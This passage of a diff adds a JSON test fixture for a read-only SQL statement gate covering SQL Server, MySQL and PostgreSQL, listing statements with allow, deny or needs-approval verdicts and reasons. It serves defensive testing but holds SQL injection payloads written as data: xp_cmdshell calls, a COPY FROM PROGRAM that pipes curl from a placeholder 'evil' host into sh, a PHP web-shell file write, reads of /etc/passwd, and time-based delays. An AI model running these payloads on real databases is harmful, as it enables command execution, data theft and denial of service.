+      "statement": "BULK INSERT t FROM 'c:\\\\data.txt'",
+      "engine": "sqlserver",
+      "verdict": "deny",
+      "reason": "stmt-bulk, layer 1",
+      "source": "objective draft, Findings: layer 1 statement keywords"
+    },
+    {
+      "statement": "WAITFOR DELAY '00:00:10'",
+      "engine": "sqlserver",
+      "verdict": "deny",
+      "reason": "stmt-waitfor, layer 1: a denial-of-service vector that writes nothing, refused by name because the tokenizer cannot judge the magnitude",
+      "source": "objective draft, Findings: denial-of-service vectors"
+    },
+    {
+      "statement": "SELECT * FROM t WHERE id = 1 WAITFOR DELAY '0:0:5'",
+      "engine": "sqlserver",
+      "verdict": "deny",
+      "reason": "stmt-waitfor matches mid-statement, which is the shape time-based injection uses",
+      "source": "PayloadsAllTheThings (MIT), MSSQL time-based techniques, rewritten"
+    },
+    {
+      "statement": "SELECT a INTO newtable FROM t",
+      "engine": "sqlserver",
+      "verdict": "deny",
+      "reason": "stmt-into, layer 2: SELECT ... INTO creates a table",
+      "source": "objective draft, Findings: layer 2 named constructs"
+    },
+    {
+      "statement": "SELECT * FROM t INTO OUTFILE '/var/www/html/shell.php'",
+      "engine": "mysql",
+      "verdict": "deny",
+      "reason": "stmt-into-outfile, layer 2: writes a file on the MySQL server",
+      "source": "PayloadsAllTheThings (MIT), MySQL file-write techniques, rewritten"
+    },
+    {
+      "statement": "SELECT 0x3c3f706870 INTO DUMPFILE '/tmp/x'",
+      "engine": "mysql",
+      "verdict": "deny",
+      "reason": "stmt-into-dumpfile, layer 2: writes a file on the MySQL server",
+      "source": "PayloadsAllTheThings (MIT), MySQL file-write techniques, rewritten"
+    },
+    {
+      "statement": "COPY t FROM PROGRAM 'curl http://evil/x | sh'",
+      "engine": "postgresql",
+      "verdict": "deny",
+      "reason": "stmt-copy and stmt-from-program, layer 2: COPY ... FROM PROGRAM executes a shell command",
+      "source": "PostgreSQL manual, COPY: https://www.postgresql.org/docs/current/sql-copy.html"
+    },
+    {
+      "statement": "SELECT * FROM OPENROWSET('SQLNCLI', 'server=x;uid=sa', 'SELECT 1')",
+      "engine": "sqlserver",
+      "verdict": "deny",
+      "reason": "fn-openrowset, layer 2: an ad hoc external connection reachable from inside a permitted SELECT",
+      "source": "T-SQL manual, OPENROWSET: https://learn.microsoft.com/en-us/sql/t-sql/functions/openrowset-transact-sql"
+    },
+    {
+      "statement": "SELECT * FROM OPENQUERY(linked, 'SELECT 1')",
+      "engine": "sqlserver",
+      "verdict": "deny",
+      "reason": "fn-openquery, layer 2: passes an uninspectable statement to a linked server",
+      "source": "objective draft, Findings: layer 2 named constructs"
+    },
+    {
+      "statement": "SELECT * FROM OPENDATASOURCE('SQLNCLI', 'server=x').db.dbo.t",
+      "engine": "sqlserver",
+      "verdict": "deny",
+      "reason": "fn-opendatasource, layer 2",
+      "source": "objective draft, Findings: layer 2 named constructs"
+    },
+    {
+      "statement": "EXEC master..xp_cmdshell 'whoami'",
+      "engine": "sqlserver",
+      "verdict": "deny",
+      "reason": "stmt-exec and fn-xp-cmdshell, layer 2",
+      "source": "PayloadsAllTheThings (MIT), MSSQL command execution, rewritten"
+    },
+    {
+      "statement": "xp_cmdshell 'dir c:\\\\'",
+      "engine": "sqlserver",
+      "verdict": "deny",
+      "reason": "fn-xp-cmdshell as the implicit EXEC: T-SQL allows a bare procedure name as the first statement of a batch, and a forbidden name is refused wherever it appears",
+      "source": "T-SQL manual, EXECUTE: https://learn.microsoft.com/en-us/sql/t-sql/language-elements/execute-transact-sql"
+    },
+    {
+      "statement": "EXEC xp_regwrite 'HKEY_LOCAL_MACHINE', 'x', 'y', 'REG_SZ', 'z'",
+      "engine": "sqlserver",
+      "verdict": "deny",
+      "reason": "fn-xp-regwrite, layer 2",
+      "source": "objective draft, Findings: layer 2 named constructs"
+    },
+    {
+      "statement": "EXEC xp_dirtree 'c:\\\\', 1, 1",
+      "engine": "sqlserver",
+      "verdict": "deny",
+      "reason": "fn-xp-dirtree, layer 2",
+      "source": "objective draft, Findings: layer 2 named constructs"
+    },
+    {
+      "statement": "EXEC sp_OACreate 'WScript.Shell', @o OUT",
+      "engine": "sqlserver",
+      "verdict": "deny",
+      "reason": "fn-sp-oacreate, layer 2",
+      "source": "PayloadsAllTheThings (MIT), MSSQL OLE automation, rewritten"
+    },
+    {
+      "statement": "EXEC sp_execute_external_script @language = N'Python', @script = N'import os'",
+      "engine": "sqlserver",
+      "verdict": "deny",
+      "reason": "fn-sp-execute-external-script, layer 2",
+      "source": "objective draft, Findings: layer 2 named constructs"
+    },
+    {
+      "statement": "sp_executesql N'SELECT 1'",
+      "engine": "sqlserver",
+      "verdict": "deny",
+      "reason": "fn-sp-executesql: dynamic execution is refused categorically, even when the string it carries looks like a read",
+      "source": "recorded decision 01KZQCXWTV8CED2SN4QCVNY6WY"
+    },
+    {
+      "statement": "SELECT pg_read_file('/etc/passwd')",
+      "engine": "postgresql",
+      "verdict": "deny",
+      "reason": "fn-pg-read-file, layer 2",
+      "source": "objective draft, Findings: layer 2 named constructs"
+    },
+    {
+      "statement": "SELECT lo_import('/etc/passwd')",
+      "engine": "postgresql",
+      "verdict": "deny",
+      "reason": "fn-lo-import, layer 2",
+      "source": "PostgreSQL manual, Large Object Functions: https://www.postgresql.org/docs/current/lo-funcs.html"
+    },
+    {
+      "statement": "SELECT lo_export(16384, '/tmp/x')",
+      "engine": "postgresql",
+      "verdict": "deny",
+      "reason": "fn-lo-export, layer 2",
+      "source": "PostgreSQL manual, Large Object Functions: https://www.postgresql.org/docs/current/lo-funcs.html"
+    },
+    {
+      "statement": "SELECT dblink_exec('dbname=x', 'DROP TABLE t')",
+      "engine": "postgresql",
+      "verdict": "deny",
+      "reason": "fn-dblink-exec, layer 2",
+      "source": "objective draft, Findings: layer 2 named constructs"
+    },
+    {
+      "statement": "SELECT pg_terminate_backend(123)",
+      "engine": "postgresql",
+      "verdict": "deny",
+      "reason": "fn-pg-terminate-backend, layer 2",
+      "source": "objective draft, Findings: layer 2 named constructs"
+    },
+    {
+      "statement": "SELECT nextval('orders_id_seq')",
+      "engine": "postgresql",
+      "verdict": "deny",
+      "reason": "fn-nextval, layer 2: advancing a sequence is a write even though the statement is a SELECT",
+      "source": "objective draft, Findings: layer 2 named constructs"
+    },
+    {
+      "statement": "SELECT setval('orders_id_seq', 1)",
+      "engine": "postgresql",
+      "verdict": "deny",
+      "reason": "fn-setval, layer 2",
+      "source": "objective draft, Findings: layer 2 named constructs"
+    },
+    {
+      "statement": "SELECT pg_advisory_lock(1)",
+      "engine": "postgresql",
+      "verdict": "deny",
+      "reason": "fn-pg-advisory-lock, layer 2: holds a lock on a database the user does not own",
+      "source": "objective draft, Findings: layer 2 named constructs"
+    },
+    {
+      "statement": "SELECT LOAD_FILE('/etc/passwd')",
+      "engine": "mysql",
+      "verdict": "deny",
+      "reason": "fn-load-file, layer 2",
+      "source": "objective draft, Findings: layer 2 named constructs"
+    },
+    {
+      "statement": "SELECT GET_LOCK('x', 10)",
+      "engine": "mysql",
+      "verdict": "deny",
+      "reason": "fn-get-lock, layer 2: both a lock and a delay",
+      "source": "objective draft, Findings: layer 2 named constructs"
+    },
+    {
+      "statement": "SELECT sys_exec('id')",
+      "engine": "mysql",
+      "verdict": "deny",
+      "reason": "fn-sys-exec, layer 2: the MySQL UDF that runs a shell command",
+      "source": "sqlmap (GPL-2.0) UDF technique, idea only"
+    },
+    {
+      "statement": "SELECT * FROM t WHERE id = 1 AND SLEEP(5)",
+      "engine": "mysql",
+      "verdict": "deny",
+      "reason": "fn-sleep: a time-based denial of service that writes nothing",
+      "source": "SecLists (MIT), time-based SQL injection payloads, rewritten"
+    },
+    {
+      "statement": "SELECT BENCHMARK(1000000, MD5('x'))",
+      "engine": "mysql",
+      "verdict": "deny",
+      "reason": "fn-benchmark: burns CPU on the target server",
+      "source": "SecLists (MIT), time-based SQL injection payloads, rewritten"
+    },
+    {
+      "statement": "SELECT pg_sleep(10)",
+      "engine": "postgresql",
+      "verdict": "deny",
+      "reason": "fn-pg-sleep: refused by name because pg_sleep(1) and pg_sleep(999999) are lexically identical",
+      "source": "objective draft, Findings: denial-of-service vectors"
+    },
+    {
+      "statement": "SELECT * FROM users WHERE id = 1 AND (SELECT 1 FROM pg_sleep(5))::text = '1'",
+      "engine": "postgresql",
+      "verdict": "deny",
+      "reason": "fn-pg-sleep matches inside a subquery and a cast, not only at the top level",
+      "source": "PayloadsAllTheThings (MIT), PostgreSQL time-based techniques, rewritten"
+    },
+    {
+      "statement": "SELECT * FROM users WHERE id = 1; EXEC xp_cmdshell 'whoami'--",
+      "engine": "sqlserver",
+      "verdict": "deny",
+      "reason": "the classic stacked-query payload: refused by multiple-statements before the forbidden names in the second statement even matter",
+      "source": "PayloadsAllTheThings (MIT), MSSQL stacked queries, rewritten"
+    },
+    {
+      "statement": "SELECT * FROM users WHERE id = 1 UNION SELECT LOAD_FILE('/etc/passwd'), 2, 3",
+      "engine": "mysql",
+      "verdict": "deny",
+      "reason": "fn-load-file inside a UNION arm, a shape that passes any leading-keyword check",
+      "source": "PayloadsAllTheThings (MIT), MySQL UNION techniques, rewritten"
+    },
+    {
+      "statement": "SELECT * FROM users WHERE id = 1 OR 1 = 1 --",
+      "engine": "mysql",
+      "verdict": "allow",
+      "reason": "read-select: a tautology returns more rows than intended but writes nothing, and this gate's guarantee is about writes; bounding the result set is the connection layer's job",
+      "source": "SecLists (MIT), generic SQL injection payloads, rewritten"
+    },
+    {
+      "statement": "SELECT dbo.CalcularSaldo(1) FROM dbo.cuentas",
+      "engine": "sqlserver",
+      "verdict": "needs-approval",
+      "reason": "unknown-function: a schema-defined function is layer 3, open by construction, so it is escalated under function:dbo.calcularsaldo rather than guessed at",
+      "source": "objective draft, Findings: layer 3"
+    },
+    {
+      "statement": "SELECT public.do_evil(name) FROM users",
+      "engine": "postgresql",
+      "verdict": "needs-approval",
+      "reason": "unknown-function: no tokenizer can tell SELECT UPPER(name) from SELECT do_evil(name), so an unlisted name is escalated and never allowed",
+      "source": "PostgreSQL manual, Function Volatility: https://www.postgresql.org/docs/current/xfunc-volatility.html"
+    },
+    {
+      "statement": "SELECT * FROM some_unknown_procedure(1)",
+      "engine": "postgresql",
+      "verdict": "needs-approval",
+      "reason": "unknown-function in a FROM clause is escalated exactly as one in a select list is",
+      "source": "objective draft, Findings: layer 3"
+    },
+    {
+      "statement": "GO",
+      "engine": "sqlserver",
+      "verdict": "deny",
+      "reason": "unknown-statement: GO is a client utility command that never reaches the server, and an unrecognised leading keyword is a terminal deny rather than an approval request, because the gate understood nothing of the statement shape",
+      "source": "T-SQL manual, GO: https://learn.microsoft.com/en-us/sql/t-sql/language-elements/sql-server-utilities-statements-go"
+    },
+    {
+      "statement": "COMMENT ON TABLE t IS 'x'",
+      "engine": "postgresql",
+      "verdict": "deny",
+      "reason": "unknown-statement: COMMENT ON writes catalogue metadata; an unrecognised leading keyword is terminal, never an approval request",
+      "source": "review finding: leading keywords that arrived as approvable"
+    },
+    {
+      "statement": "SAVEPOINT sp1",
+      "engine": "postgresql",
+      "verdict": "deny",
+      "reason": "unknown-statement: SAVEPOINT changes transaction state",
+      "source": "review finding: leading keywords that arrived as approvable"
+    },
+    {
+      "statement": "BINLOG 'AAAAAA=='",
+      "engine": "mysql",
+      "verdict": "deny",
+      "reason": "unknown-statement: BINLOG replays row events, so approving the keyword class would approve arbitrary writes",
+      "source": "review finding: leading keywords that arrived as approvable"
+    },
+    {
+      "statement": "CHANGE MASTER TO MASTER_HOST='x'",
+      "engine": "mysql",
+      "verdict": "deny",
+      "reason": "unknown-statement: CHANGE MASTER TO reconfigures replication",
+      "source": "review finding: leading keywords that arrived as approvable"
+    },
+    {
+      "statement": "STOP SLAVE",
+      "engine": "mysql",
+      "verdict": "deny",
+      "reason": "unknown-statement: STOP SLAVE halts replication on the target server",
+      "source": "review finding: leading keywords that arrived as approvable"
+    },
+    {
+      "statement": "DECLARE @x INT",
+      "engine": "sqlserver",
+      "verdict": "deny",
+      "reason": "unknown-statement: DECLARE opens a batch whose remainder the gate never sees",
+      "source": "review finding: leading keywords that arrived as approvable"
+    },
+    {
+      "statement": "SEL/**/ECT 1",
+      "engine": "mysql",
+      "verdict": "deny",
+      "reason": "unknown-statement: a comment splitting a keyword produces a leading token on no allowlist, and an unrecognised leading keyword is terminal",
+      "source": "sqlmap (GPL-2.0) tamper-script techniques, idea only"
+    },
+    {
+      "statement": "1 UNION SELECT 1",
+      "engine": "mysql",
+      "verdict": "deny",
+      "reason": "leading-token-not-a-keyword: a statement that does not begin with a word cannot be proven to be a read",
+      "source": "SecLists (MIT), UNION injection payloads, rewritten"
+    },
+    {
+      "statement": "(SELECT 1) UNION (SELECT 2)",
+      "engine": "postgresql",
+      "verdict": "deny",
+      "reason": "leading-token-not-a-keyword: a parenthesised leading SELECT is a legitimate read this gate refuses rather than special-cases, which is the fail-closed direction",
+      "source": "hand-written boundary case"
+    },
+    {
+      "statement": "SELECT 'abc",
+      "engine": "mysql",
+      "verdict": "deny",
+      "reason": "tokenize-error: an unterminated string literal is refused, never scanned past",
+      "source": "objective draft, acceptance criterion 6"
+    },
+    {
+      "statement": "SELECT * FROM t /* unterminated",
+      "engine": "postgresql",
+      "verdict": "deny",
+      "reason": "tokenize-error: an unterminated block comment is refused",
+      "source": "objective draft, acceptance criterion 6"
+    },
+    {
+      "statement": "SELECT /*!50000 1",
+      "engine": "mysql",
+      "verdict": "deny",
+      "reason": "tokenize-error: an unterminated executable comment is refused like any other unterminated comment",
+      "source": "objective draft, acceptance criterion 6"
+    },
+    {
+      "statement": "SELECT $tag$ unterminated",
+      "engine": "postgresql",
+      "verdict": "deny",
+      "reason": "tokenize-error: a dollar-quoted string with no closing tag is refused",
+      "source": "objective draft, acceptance criterion 6"
+    },
+    {
+      "statement": "SELECT * FROM [unterminated",
+      "engine": "sqlserver",
+      "verdict": "deny",
+      "reason": "tokenize-error: an unterminated bracket identifier is refused",
+      "source": "objective draft, acceptance criterion 6"
+    },
+    {
+      "statement": "SELECT 1 \\G",
+      "engine": "mysql",
+      "verdict": "deny",
+      "reason": "tokenize-error: a backslash outside a literal is not punctuation in any of the three dialects, and MySQL's \\G is a client-side separator the server never sees",
+      "source": "MySQL manual, mysql client commands: https://dev.mysql.com/doc/refman/8.0/en/mysql-commands.html"
+    },
+    {
+      "statement": "SELECT (1",
+      "engine": "mysql",
+      "verdict": "deny",
+      "reason": "unbalanced-parentheses: the gate refuses what it cannot parenthesis-match rather than guessing the nesting",
+      "source": "objective draft, acceptance criterion 6"
+    },
+    {
+      "statement": "SELECT 1)",
+      "engine": "mysql",
+      "verdict": "deny",
+      "reason": "unbalanced-parentheses in the other direction",
+      "source": "objective draft, acceptance criterion 6"
+    },
+    {
+      "statement": "-- nothing but a comment",
+      "engine": "postgresql",
+      "verdict": "deny",
+      "reason": "empty-statement: a statement with no tokens is refused rather than treated as a harmless no-op",
+      "source": "objective draft, acceptance criterion 6"
+    },
+    {
+      "statement": "/* nothing but a comment */",
+      "engine": "sqlserver",
+      "verdict": "deny",
+      "reason": "empty-statement: a block comment alone is refused rather than treated as a harmless no-op",
+      "source": "objective draft, acceptance criterion 6"
+    },
+    {
+      "statement": "SELECT id, name, created_at FROM users WHERE created_at > '2024-01-01' ORDER BY created_at DESC",
+      "engine": "postgresql",
+      "verdict": "allow",
+      "reason": "read-select: the ordinary read the gate exists to keep working",
+      "source": "hand-written legitimate read"
+    },
+    {
+      "statement": "SELECT TOP (100) * FROM dbo.orders WITH (NOLOCK) WHERE status = 'open'",
+      "engine": "sqlserver",
+      "verdict": "allow",
+      "reason": "read-select: TOP (n) and a WITH (NOLOCK) table hint are parenthesised keywords, not function calls, and the hint is the shape that avoids degrading the external server",
+      "source": "hand-written legitimate read"
+    },
+    {
+      "statement": "SELECT c.name, ty.name AS type FROM sys.columns c JOIN sys.types ty ON c.user_type_id = ty.user_type_id WHERE c.object_id = OBJECT_ID('dbo.orders')",
+      "engine": "sqlserver",
+      "verdict": "allow",
+      "reason": "read-select over catalogue views with the OBJECT_ID safe builtin: the schema navigation the parent objective depends on",
+      "source": "hand-written legitimate read"
+    },
+    {
+      "statement": "SELECT table_name, column_name, data_type FROM information_schema.columns WHERE table_schema = 'public' ORDER BY table_name, ordinal_position",
+      "engine": "postgresql",
+      "verdict": "allow",
+      "reason": "read-select over information_schema, the portable schema navigation path",
+      "source": "hand-written legitimate read"
+    },
+    {
+      "statement": "SELECT COUNT(*) AS n, UPPER(TRIM(name)) AS k FROM users GROUP BY UPPER(TRIM(name)) HAVING COUNT(*) > 1",
+      "engine": "mysql",
+      "verdict": "allow",
+      "reason": "read-select with nested safe builtins only",
+      "source": "hand-written legitimate read"
+    },
+    {
+      "statement": "SELECT CONVERT(varchar(10), GETDATE(), 120) AS d",
+      "engine": "sqlserver",
+      "verdict": "allow",
+      "reason": "read-select: a type name followed by a parenthesis is not a function call, so CAST and CONVERT keep working",
+      "source": "hand-written legitimate read"
+    },
+    {
+      "statement": "SELECT ROW_NUMBER() OVER (PARTITION BY dept ORDER BY salary DESC) AS rn, name FROM staff",
+      "engine": "sqlserver",
+      "verdict": "allow",
+      "reason": "read-select with a window function; OVER and PARTITION are non-function keywords",
+      "source": "hand-written legitimate read"
+    },
+    {
+      "statement": "SHOW COLUMNS FROM users",
+      "engine": "mysql",
+      "verdict": "allow",
+      "reason": "read-show: MySQL schema metadata",
+      "source": "hand-written legitimate read"
+    },
+    {
+      "statement": "DESCRIBE users",
+      "engine": "mysql",
+      "verdict": "allow",
+      "reason": "read-describe: MySQL column metadata",
+      "source": "hand-written legitimate read"
+    },
+    {
+      "statement": "EXPLAIN SELECT * FROM users WHERE id = 1",
+      "engine": "postgresql",
+      "verdict": "allow",
+      "reason": "read-explain: a prefix read statement, so the SELECT that follows is a continuation and not a second statement",
+      "source": "hand-written legitimate read"
+    },
+    {
+      "statement": "EXPLAIN ANALYZE SELECT * FROM users",
+      "engine": "postgresql",
+      "verdict": "deny",
+      "reason": "stmt-analyze: EXPLAIN ANALYZE executes the statement it explains, so it is not merely a plan read",
+      "source": "PostgreSQL manual, EXPLAIN: https://www.postgresql.org/docs/current/sql-explain.html"
+    },
+    {
+      "statement": "VALUES (1), (2)",
+      "engine": "postgresql",
+      "verdict": "allow",
+      "reason": "read-values: a constant row set",
+      "source": "hand-written legitimate read"
+    },
+    {
+      "statement": "SELECT @@VERSION",
+      "engine": "sqlserver",
+      "verdict": "allow",
+      "reason": "read-select: a server variable is a variable token, never a keyword or a call",
+      "source": "hand-written legitimate read"
+    },
+    {
+      "statement": "SELECT * FROM #tmp_results",
+      "engine": "sqlserver",
+      "verdict": "allow",
+      "reason": "read-select: # begins a T-SQL temporary table name rather than a line comment, which is the opposite of its MySQL meaning",
+      "source": "T-SQL manual, Database Identifiers: https://learn.microsoft.com/en-us/sql/relational-databases/databases/database-identifiers"
+    },
+    {
+      "statement": "SELECT * FROM generate_series(1, 10)",
+      "engine": "postgresql",
+      "verdict": "allow",
+      "reason": "read-select: generate_series is on the safe-builtin allowlist for PostgreSQL",
+      "source": "hand-written legitimate read"
+    },
+    {
+      "statement": "SELECT IF(a > 1, 'y', 'n') FROM t",
+      "engine": "mysql",
+      "verdict": "allow",
+      "reason": "read-select: IF is a safe builtin in MySQL, which is why the safe-function allowlist is engine-scoped",
+      "source": "hand-written legitimate read"
+    },
+    {
+      "statement": "SELECT IF(a > 1, 'y', 'n') FROM t",
+      "engine": "sqlserver",
+      "verdict": "needs-approval",
+      "reason": "unknown-function: IF is control flow rather than a builtin in T-SQL, so the same text is not provably a read there",
+      "source": "hand-written engine-divergence case"
+    }
+  ]
+}
